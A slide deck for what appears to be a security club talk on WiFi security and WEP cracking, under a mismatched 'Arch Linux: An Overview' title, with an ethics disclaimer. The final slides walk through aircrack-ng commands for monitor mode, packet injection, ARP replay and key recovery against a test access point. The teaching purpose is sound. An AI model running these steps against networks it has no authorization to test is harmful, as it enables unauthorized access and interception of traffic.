---
title: 'Arch Linux: An Overview'
author: William Osler
date:   January 28, 2016
theme:  metropolis
logo:   logo.pdf
defcolor:
  -
    name: OSCRed
    rgb: 152,27,30
  -
    name: OSCGray
    rgb: 102,102,102
  -
    name: DarkerGray
    rgb: 44,44,44
  -
    name: LighterGray
    rgb: 211,211,211
setcolor:
  -
    type: normal text
    fg: DarkerGray
    bg: white
  -
    type: alerted text
    fg: OSCRed
    bg: white
  -
    type: frametitle
    fg: OSCRed
    bg: LighterGray
links-as-notes: true
cc-by: true
---

## Disclaimer

The information contained in this presentation is intended for lawful,
educational purposes only, and serves to teach people how to protect their own
networks and defend themselves from attack. The author is **NOT** responsible
for any illegal or malicious use of the knowledge contained within.

## A Note on Ethics and Hacking

Treat other systems as you would want to be treated. It is illegal and unethical
to use methods like the ones presented to attack a network that is not yours or
that you do not have permission to attack.

If you try this on an OSU provided network and are caught:

. . .

1. You will be kicked out of the club.

. . .

2. If the attack is related to academic misconduct, you can receive a 0 on the
assignment or fail the course.

. . .

3. If the university feels like it, they can expel you.

. . .

4. You can get put in jail, as unauthorized access to computer systems is
illegal.

# Overview

## WiFi Basics

*"WiFi Networks"* are wireless networks that allow multiple computers to
exchange data frames over radio frequencies.

- Specification is IEEE 802.11
    - Sometimes followed by a set of letters that indicate speed, frequency,
      channels, etc
- Computers exchange messages by broadcasting them into the air using RF
    - *Important*: Every frame sent is trivially easy to read if you're close
      enough

## WiFi Basics

- *Access Points* provide a bridge between a wired and wireless network
    - Networks identified by a series of 32 bytes, called an *SSID*
        - The SSID is usually textual, but doesn't have to be
    - Interfaces on the network (including the ones on the router and device)
      are identified with a *MAC address*
- An access point will generally advertise itself with a *beacon frame*
    - Contains the SSID, encryption, and other information
    - This is how your device can make a list of all nearby APs
- Most wireless networks run in *infrastructure mode*
    - Every client communicates through the access point

## WiFi Networks

![A sample scenario](./wireless_diagram.pdf)


# Security & Attack Scenarios

## Attack Scenario: Confidentiality

![Attacking Data Confidentiality](./confidentiality_attack.pdf)

## Attack Scenario: Access Control

![Gaining Network Access](./access_control_attack.pdf)

## Common (Questionable) Access Control Recommendations

*MAC address whitelisting*
- Denies connection attempts from MAC addresses that aren't on the whitelist
- Does this provide proper access control?
    - *No!* Every frame sent has its MAC address sent in the clear
    - An attacker can simply lie about their MAC to get on the network
    - It also makes configuration a pain

## Common (Questionable) Access Control Recommendations

*SSID hiding*
- Stops the access point from sending beacon frames, making the network not show
  up in lists
- Does this provide proper access control?
    - *No!* Sniffing network traffic is enough to determine the connection
      parameters
    - Worse still, if your device is set to autoconnect, it will constantly
      attempt to connect, broadcasting frames containing your SSID
    - It also makes configuration a pain

## Wireless Security

The real way to protect your wireless network is using one of the *wireless
security standards*. These protect your network's secrecy and enforce access
control.

Common options include:
- Wired Equivalent Privacy (WEP)
- Wi-Fi Protected Access (WPA)
- Wi-Fi Protected Access version 2 (WPA2)

## Wired Equivalent Privacy (WEP)

- Released in 1997 with the 802.11 spec
- *Old, insecure, and superceded by WPA and WPA2*
- Key input is 40 bits of key, 24 bits of random data, called the *initialization vector*
    - IV generation in WEP is flawed and can sometimes be predicted

![WEP Encryption Scheme](./wep-crypt-alt.pdf){width=3in}

## Cracking WEP

[The Fluhrer, Mantin and Shamir
attack:](https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack)

Discovered in 2001

>With certain IVs, an attacker knowing the first byte of the keystream and the
>first m bytes of the key can derive the (m + 1)th byte of the key due to a
>weakness in the PRNG used to generate the keystream ... the first byte of the
>plaintext comes from the WEP SNAP header

## Cracking WEP

FMS Attack:

> With 60 [vulnerable] IVs, the attacker can rederive the key byte with
> reasonable probability of success.

> If the IVs are generated by a multibyte counter in little endian order ...
> this requires about 4,000,000 packets ... If the IVs are generated ... in big
> endian order ... this requires approximately 1,000,000 packets

$$ 1,500 \text{ bytes} \times 1,000,000 = 1.5 \text{ gigabytes}$$
$$ 1,500 \text{ bytes} \times 4,000,000 = 6 \text{ gigabytes}$$

## Cracking WEP

The KoreK attack:
- Even more correlations between IVs found by someone using the psuedonym KoreK
- Brings attack down to about 700,000 packets for 50% chance

$$ 1,500 \text{ bytes} \times 700,000 = 1.05 \text{ gigabytes}$$

The PTW attack:
- Discovered in 2007 by Pyshkin, Tews, and Weinmann
- Allowed even more packets to be used to guess correlations
- Down to 35,000 to 40,000 packets for 50% probability

$$ 1,500 \text{ bytes} \times 40,000 = 60 \text{ megabytes}$$

## Cracking WEP

The [aircrack-ng](http://dl.aircrack-ng.org/breakingwepandwpa.pdf) attack
- 2008 attack combining KoreK and PTW
- Requires about 24,200 packets for 50% probability

$$ 1,500 \text{ bytes} \times 24,200 = 36.3 \text{ megabytes}$$

## Attacking WEP with Aircrack-NG

We'll be following the [aircrack-ng WEP simple cracking
guide](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack).

1. Put your interface in monitor mode
2. Listen for about 40k-85k packets
3. Crack the IVs

To speed up step 2, you can use *ARP-request reinjection*, where you detect an
already encrypted and authenticated ARP packet from someone else and rebroadcast
it repeatedly.
- You can identify an encrypted ARP packet because it's always 28 bytes

## Monitor Mode

Normally, a network card is configured to only notice and respond to frames
directly addressed to it. To hear everything, you need to put the card in
*monitor mode*:

```bash
airmon-ng stop wlp2s0-mon
airmon-ng start wlp2s0 6  # 6 is the channel of the network
iwconfig wlp2s0-mon       # Make sure "Mode" is "Monitor"
```

This will create a new interface named `$NAME-mon`.

(For the rest of this presentation, `wlp2s0-mon` will be the wireless interface,
and 6 will be the channel of the network we're trying to attack).

## Packet Injection

Test that you're able to send arbitrary packets to the access point:

```bash
aireplay-ng -9 -e "LAN ONLY - NO INTERNET" \
    -a 00:1C:10:49:8E:D6 wlp2s0mon
```

Look for the following lines:
```
Injection is working!
Found 1 AP
...
Ping (min/avg/max): 1.358ms/2.801ms/11.066ms Power: -34.17
30/30: 100%
```

That last line should be close to 100%

## Capturing packets

Start capturing packets using the monitor interface:

```bash
airodump-ng -c 6 --bssid 00:1C:10:49:8E:D6 \
    -w output wlp2s0mon
```

This will dump packets to the file `output`.

## Speeding things up with ARP injection

Associate with the network:

```bash
aireplay-ng -1 0 -e "LAN ONLY - NO INTERNET" \
    -a 00:1C:10:49:8E:D6 -h 74:e5:0b:84:01:fe wlp2s0mon
```

Reply ARP attacks:

```bash
aireplay-ng -3 -b 00:1C:10:49:8E:D6 \
    -h 74:e5:0b:84:01:fe wlp2s0mon
```

This will wait for an ARP, then start repeating it. Wait until you've collected
around 90k frames.

## Cracking the Key

```bash
aircrack-ng -b 00:1C:10:49:8E:D6 output*.cap
```

With any luck:

```
Starting PTW attack with 73329 ivs.
                     KEY FOUND! [ 33:78:3A:86:68 ]
	Decrypted correctly: 100%
```

## Cracking WEP

![Mission Accomplished](./bush-mission-accomplished.jpg)\
